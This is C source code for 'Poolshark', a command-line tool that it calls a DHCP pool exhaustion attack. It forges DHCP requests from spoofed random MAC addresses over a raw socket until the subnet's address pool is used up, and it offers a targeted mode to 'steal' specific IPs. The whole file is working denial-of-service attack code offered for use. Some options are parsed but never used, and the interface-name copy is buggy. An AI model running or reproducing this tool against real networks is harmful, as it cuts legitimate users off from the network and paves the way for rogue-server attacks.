#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <time.h>
#include <net/ethernet.h> 
#include <ifaddrs.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <getopt.h>
#include <signal.h>

#define BUFFER_SIZE 65535
volatile sig_atomic_t keep_running = 1;

// DHCP header structure
typedef struct DHCP
{
    uint8_t opcode;
    uint8_t hw_type;
    uint8_t hw_len;
    uint8_t hops;
    uint8_t transaction_id[4];
    uint8_t sec_elapsed[2];
    uint8_t flags[2];
    uint8_t client_ip[4];
    uint8_t ip_addr[4];
    uint8_t server_ip[4];
    uint8_t gtwy_ip[4];
    uint8_t client_mac[16];
    uint8_t server_name[64];
    uint8_t boot_file[128];
    uint8_t magic_cookie[4];
    uint8_t options[312];

} __attribute__((packed)) DHCP;

// IP header structure
typedef struct IP
{
    uint8_t version_ihl;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id; 
    uint16_t flags_offset;
    uint8_t ttl;
    uint8_t proto;
    uint16_t checksum;
    uint8_t src_ip[4];
    uint8_t dst_ip[4];

} __attribute__((packed)) IP;

typedef struct UDP
{
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t len;
    uint16_t checksum;
} __attribute__((packed)) UDP;

typedef struct EthHeader
{
    uint8_t  dst_mac[6];   
    uint8_t  src_mac[6];
    uint16_t eth_type;
} __attribute__((packed)) EthHeader;

typedef struct Packet
{
    EthHeader eth;
    IP ip;
    UDP udp;
    DHCP dhcp;
} __attribute__((packed)) Packet;

typedef struct Exausted
{
    uint8_t ip[4];
    uint8_t mac[16];
    uint32_t lease_time;
    struct Exausted *next;
} Exausted;

void print_usage(const char *progname);
void spoof_mac(uint8_t *mac);
void rand_transaction_id(uint8_t *id);
void calc_ip_checksum(Packet *p);
int netmask_to_cidr(unsigned long netmask);
void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname);
void stop(int sig);
void cleanup(Packet *p, Exausted *head, int sock);

int main(int argc, char *argv[])
{
    signal(SIGINT, stop);
    char *iface = NULL;
    char *import_file = NULL;
    int opt;
    int delay = 0;
    FILE *fp = NULL;
    Exausted *head = NULL;
    const char *hostname = "pwn3d-poolshark";

    if(getuid() != 0)
    {
        printf("Error: Poolshark requires root priveledges\n");
        printf("Try: sudo %s -i <interface>\n", argv[0]);
        return 1;
    }

    while((opt = getopt(argc, argv, "i:d:f:n:h")) != -1)
    {
        switch (opt)
        {
            case 'i':
                iface = optarg;
                break;
            case 'h':
                print_usage(argv[0]);
                exit(EXIT_SUCCESS);
            case 'd':
                delay = atoi(optarg);
                break;
            case 'f':
                import_file = optarg;
                break;
            case 'n':
                hostname = optarg;
                break;
        }
    }

    if(!iface)
    {
        printf("Error: Interface is required\n");
        exit(EXIT_FAILURE);
    }

    if(import_file)
    {
        fp = fopen(import_file, "r");
        if(!fp)
        {
            perror("fopen");
            return 1;
        }
    }

    Packet *p = malloc(sizeof(Packet));
    

    struct ifreq ifr;
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if(!p)
    {
        perror("malloc");
        return 1;
    }

    if(sock < 0)
    {
        perror("socket");
        return 1;
    }
    
    srand(time(NULL));

    // init Ethernet header
    spoof_mac(p->eth.src_mac);
    memset(p->eth.dst_mac, 0xff, sizeof(p->eth.dst_mac));
    p->eth.eth_type = htons(0x0800);

    // init IP header
    //version 4 header length 5
    p->ip.version_ihl = 0x45;
    p->ip.tos = 0;
    // IP + UDP + DHCP headers
    p->ip.total_len = htons(20 + 8 + 552);
    p->ip.id = htons(0);
    // don't fragment, no offset
    p->ip.flags_offset = htons(0x4000);
    p->ip.ttl = 64;
    // protocol will be UDP
    p->ip.proto = 17;
    // will be calculated once the entire packet is built
    p->ip.checksum = 0;
    memset(p->ip.src_ip, 0x00, sizeof(p->ip.src_ip));
    memset(p->ip.dst_ip, 0xff, sizeof(p->ip.dst_ip));

    // init udp header
    p->udp.src_port = htons(68);
    p->udp.dst_port = htons(67);
    p->udp.len = htons(8 + 552);
    p->udp.checksum = 0;

    // init dhcp header
    p->dhcp.opcode = 1;
    p->dhcp.hw_type = 1;
    p->dhcp.hw_len = 6;
    p->dhcp.hops = 0;
    rand_transaction_id(p->dhcp.transaction_id);
    memset(p->dhcp.sec_elapsed, 0x00, sizeof(p->dhcp.sec_elapsed));
    memset(p->dhcp.flags, 0x00, sizeof(p->dhcp.flags));
    memset(p->dhcp.client_ip, 0x00, sizeof(p->dhcp.client_ip));
    memset(p->dhcp.server_ip, 0x00, sizeof(p->dhcp.server_ip));
    memset(p->dhcp.gtwy_ip, 0x00, sizeof(p->dhcp.gtwy_ip));
    memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
    memset(p->dhcp.server_name, 0x00, sizeof(p->dhcp.server_name));
    memset(p->dhcp.boot_file, 0x00, sizeof(p->dhcp.boot_file));
    memset(p->dhcp.ip_addr, 0x00, sizeof(p->dhcp.ip_addr));
    p->dhcp.magic_cookie[0] = 99;
    p->dhcp.magic_cookie[1] = 130;
    p->dhcp.magic_cookie[2] = 83;
    p->dhcp.magic_cookie[3] = 99;
    p->dhcp.options[0] = 53;
    p->dhcp.options[1] = 1;
    p->dhcp.options[2] = 1;
    p->dhcp.options[3] = 255;
    memset(&p->dhcp.options[4], 0x00, 308);
    calc_ip_checksum(p);

    

    struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
    memcpy(ifr.ifr_name, iface, sizeof(iface));

    int ifindex = if_nametoindex(ifr.ifr_name);

    if(ifindex < 0)
    {
        perror("if_nametoindex");
        return 1;
    }

    if(ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
    {
        perror("ioctl");
        return 1;
    }

    int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
    int num_of_ips = (1 << (32 - cidr)) - 2;
 
    exaust_pool(sock, ifindex, p, &head, num_of_ips, 0, hostname);
    cleanup(p, head, sock);
}

void spoof_mac(uint8_t *mac)
{
    for(int i = 0; i < 6; i++)
    {
        mac[i] = rand() % 256;
    }
    // clear the unicast bit and set the locally administered bit
    mac[0] = (mac[0] & 0xfe) | 0x02;

}

void rand_transaction_id(uint8_t *id)
{
    for(int i = 0; i < 4; i++)
    {
        id[i] = rand() % 256;
    }
}

void calc_ip_checksum(Packet *p)
{
    p->ip.checksum = 0;

    uint32_t sum = 0;
    uint16_t word;
    int ip_header_len = sizeof(p->ip);
    
    for(int i = 0; i < ip_header_len / 2; i++)
    {
        memcpy(&word, (uint8_t *)&p->ip + (i * 2), sizeof(uint16_t));
        sum += ntohs(word);
    }

    while(sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    p->ip.checksum = htons(~sum & 0xffff);
}

int netmask_to_cidr(unsigned long netmask)
{
    int cidr = 0;

    while(netmask)
    {
        cidr += netmask & 1;
        netmask >>= 1;
    }

    return cidr;
}


void exaust_pool(int sock, int ifindex, Packet *p, Exausted **head, int num, int delay, const char *hostname)
{
    unsigned char buffer[BUFFER_SIZE];
    char random_mac[18];
    char host[16];
    char offered_ip[16];
    int len = strlen(hostname);
    int offset = 0;
    int count = 0;
    bool success = false;

    for(int i = 0; i < num && keep_running; i++)
    {
        spoof_mac(p->eth.src_mac);
        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
        rand_transaction_id(p->dhcp.transaction_id);
        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));

        p->dhcp.options[0] = 53;
        p->dhcp.options[1] = 1;
        p->dhcp.options[2] = 1;
        p->dhcp.options[3] = 255;

        snprintf(random_mac, sizeof(random_mac), "%02X:%02X:%02X:%02X:%02X:%02X", 
        p->eth.src_mac[0],
        p->eth.src_mac[1],
        p->eth.src_mac[2],
        p->eth.src_mac[3],
        p->eth.src_mac[4],
        p->eth.src_mac[5]
        );

        struct sockaddr_ll addr = {0};
        socklen_t addr_len = sizeof(addr);
        addr.sll_family = AF_PACKET;
        addr.sll_ifindex = ifindex;
        addr.sll_halen = 6;
        memset(addr.sll_addr, 0xff, 6);

        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));

        if(bytes_sent < 0)
        {
            perror("sendto");
            return;
        }

        while(keep_running)
        {

            int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
            if(bytes_received < 0)
            {
                perror("recvfrom");
                return;
            }
            // create a new Packet object, then fill it in with the response
            
            Packet *response_packet = (struct Packet *)buffer;

            if(response_packet->dhcp.opcode != 0x02)
            {
                continue;
            }

            if(memcmp(response_packet->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) != 0)
            {
                continue;
            }

            snprintf(host, sizeof(host), "%d.%d.%d.%d", 
            response_packet->ip.src_ip[0],
            response_packet->ip.src_ip[1],
            response_packet->ip.src_ip[2],
            response_packet->ip.src_ip[3]
            );

            snprintf(offered_ip, sizeof(offered_ip), "%d.%d.%d.%d", 
            response_packet->dhcp.ip_addr[0],
            response_packet->dhcp.ip_addr[1],
            response_packet->dhcp.ip_addr[2],
            response_packet->dhcp.ip_addr[3]
            );

            offset = 0;

            p->dhcp.options[offset++] = 53;
            p->dhcp.options[offset++] = 1;
            p->dhcp.options[offset++] = 3;

            p->dhcp.options[offset++] = 50;
            p->dhcp.options[offset++] = 4;
            memcpy(&p->dhcp.options[offset], &response_packet->dhcp.ip_addr[0], 4);
            offset += 4;

            p->dhcp.options[offset++] = 54;
            p->dhcp.options[offset++] = 4;
            memcpy(&p->dhcp.options[offset], &response_packet->ip.src_ip[0], 4);
            offset += 4;

            p->dhcp.options[offset++] = 12;
            p->dhcp.options[offset++] = len;
            memcpy(&p->dhcp.options[offset], hostname, len);
            offset += len;

            p->dhcp.options[offset++] = 255;

            memset(&p->dhcp.options[offset], 0, 312 - offset);

            calc_ip_checksum(p);

            bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
            if(bytes_sent < 0)
            {
                perror("sendto");
                return;
            }

            while(keep_running)
            {
                int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);

                if(bytes_received < 0)
                {
                    perror("recvfrom");
                    return;
                }

                response_packet = (struct Packet *)buffer;

                if(response_packet->dhcp.opcode != 0x02)
                {
                    continue;
                }
                if(memcmp(response_packet->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) != 0)
                {
                    continue;
                }

                Exausted *new_node = malloc(sizeof(Exausted));
                if(!new_node)
                {
                    perror("malloc");
                    return;
                }
                count++;
                printf("\033[2J\033[H");
                fflush(stdout);
                printf("[%d] IP addresses in subnet --- Exausted [%d/%d]\n", num, count, num);

                memcpy(&new_node->ip, &response_packet->dhcp.ip_addr, sizeof(response_packet->dhcp.ip_addr));
                memcpy(&new_node->mac, &p->eth.src_mac, sizeof(p->eth.src_mac));
                new_node->lease_time = 7200;
                new_node->next = *head;
                *head = new_node;
                break;
            }
            break;
        } 
    }
}

void print_usage(const char *progname)
{
    printf("Poolshark - DHCP Pool Exaustion Tool\n\n");
    printf("Usage: sudo %s -i <interface> [-d][-f][-n][-h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
    printf("\n");
    printf("Options:\n");
    printf(" -d <delay>      Delay between requests in milliseconds (default: 0)\n");
    printf(" -f <file>       Import Cardshark CSV to steal specific IPs first\n");
    printf(" -n <hostname>   Custom hostname for DHCP requests (default: pwn3d-poolshark)\n");
    printf(" -h              Display this help message\n");
    printf("\n");
    printf("Examples:\n");
    printf(" sudo %s -i eth0\n", progname);
    printf(" sudo %s -i wlan0 -d 1000\n", progname);
    printf(" sudo %s -i eth0 -f cardshark_scan.csv\n", progname);
    printf(" sudo %s -i eth0 -n h4ck3ed -d 500\n", progname);
    printf("\n");
    printf("Attack Modes:\n");
    printf(" Normal:   Exhausts entire DHCP pool with random MAC addresses\n");
    printf(" Targeted: Uses -f to steal specific IPs first, then exhausts remainder\n");
    printf("\n");
    printf("Press Ctrl+C to stop exaust attack.\n");
}

void cleanup(Packet *p, Exausted *head, int sock)
{
    printf("\n\nCleaning up... ");
    Exausted *current = head;

    while(current != NULL)
    {
        Exausted *tmp = current;
        current = current->next;
        free(tmp);
    }

    free(p);
    close(sock);
    printf(" [OK]\n");
}

void stop(int sig)
{
    keep_running = 0;
}
